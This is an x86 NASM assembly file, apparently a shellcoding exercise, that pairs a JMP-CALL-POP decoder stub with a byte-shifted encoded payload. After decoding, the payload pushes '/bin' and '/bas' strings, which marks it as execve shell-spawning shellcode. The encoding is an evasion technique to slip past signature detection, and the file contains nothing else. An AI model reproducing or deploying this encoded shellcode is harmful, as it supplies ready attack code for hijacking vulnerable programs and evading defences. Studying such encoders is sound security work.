

global _start

section .text

_start:

jmp short call_shellcode

decoder: 

	pop esi
	xor ecx, ecx
	mov cl, len

decode:

	cmp byte [esi], 0xC
	jl wrap
	sub byte [esi], 0xC
	jmp short nextByte

wrap:

	xor ebx, ebx
	mov bl, 0xff
	inc bx
	sub bl, 0xC
	add bl, byte [esi]
	mov byte [esi], bl 


nextByte:

	inc esi
	loop decode
	jmp short shellcode



call_shellcode:

call decoder

shellcode:

 db 0x74,0x4f,0x4f,0x50,0x50,0x74,0x4e,0x4e,0x4f,0x4f,0x74,0x74,0x4d,0x4e,0x4e,0x74,0x3b,0x6e,0x6d,0x7f,0x74,0x3b,0x6e,0x75,0x7a,0x3d,0xe7,0x94,0x68,0x30,0x15,0x95,0x70,0x30,0x16,0x95,0x68,0x30,0x1a,0x99,0x28,0x30,0x99,0x58,0x30,0x16,0x99,0x60,0x30,0x1a,0x3d,0xcc,0xbc,0x17,0xd9,0x8c

 len: equ $-shellcode
